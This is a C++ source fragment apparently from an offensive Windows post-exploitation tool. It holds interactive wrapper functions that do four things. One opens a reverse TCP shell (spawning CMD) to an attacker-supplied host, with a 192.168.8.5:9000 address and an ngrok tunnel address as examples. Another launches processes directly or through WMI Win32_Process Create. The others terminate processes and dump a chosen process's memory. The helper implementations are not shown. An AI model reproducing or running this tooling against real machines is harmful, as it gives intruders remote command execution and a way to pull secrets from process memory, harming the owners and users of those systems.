void Main_ReverseTCP() {
	printf("################################# EXAMPLES #################################\n");
	printf("# Address : 192.168.8.5                                                    #\n");
	printf("# Port    : 9000                                                           #\n");
	printf("#--------------------------------------------------------------------------#\n");
	printf("# Address : tcp://2.tcp.ngrok.io:11650                                     #\n");
	printf("################################### NOTE ###################################\n");
	printf("# Process will run as a child process.                                     #\n");
	printf("############################################################################\n");
	printf("\n");
	url info = ParseURL(Input("Enter address"));
	printf("\n");
	if (info.port.length() < 1) {
		info.port = Input("Enter port number");
		printf("\n");
	}
	if (info.host.length() < 1 || info.port.length() < 1) {
		printf("Both parameters are required\n");
	}
	else if (!IsPositiveNumber(info.port)) {
		printf("Port number must be a positive number\n");
	}
	else {
		std::string path = GetFilePath();
		path.length() > 0 ? ReverseTCP(info.host, info.port, path, "") : ReverseTCP(info.host, info.port, "", "CMD");
	}
}

void Main_RunProcess(bool wmi = false) {
	printf("################################# EXAMPLES #################################\n");
	printf("# File : C:\\Windows\\System32\\cmd.exe | C:\\Windows\\SysWOW64\\cmd.exe         #\n");
	printf("# Args : /K WHOAMI /PRIV                                                   #\n");
	printf("#--------------------------------------------------------------------------#\n");
	printf("# File : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe         #\n");
	printf("################################### NOTE ###################################\n");
	printf("# Process will run in a new window.                                        #\n");
	printf("############################################################################\n");
	printf("\n");
	std::string file = Input("Enter file name");
	printf("\n");
	std::string args = Input("Enter file arguments (optional)");
	printf("\n");
	if (file.length() < 1) {
		printf("File name is rquired\n");
	}
	else {
		wmi ? WMIExecuteMethod("Win32_Process", "Win32_Process", "Create", "CommandLine", args.length() > 0 ? file.append(" ").append(args) : file, wInfo.space) : RunProcess(file, args);
	}
}

void Main_TerminateProcess(bool wmi = false) {
	DWORD pid = 0;
	if (GetProcessID(&pid)) {
		printf("\n");
		wmi ? WMIExecuteMethod(std::string("Win32_Process.Handle=\"").append(std::to_string(pid)).append("\""), "Win32_Process", "Terminate", "Reason", "", wInfo.space) : ShutDownProcess(pid);
	}
}

void Main_DumpProcessMemory() {
	DWORD pid = 0;
	if (GetProcessID(&pid)) {
		printf("\n");
		DumpProcessMemory(pid);
	}
}

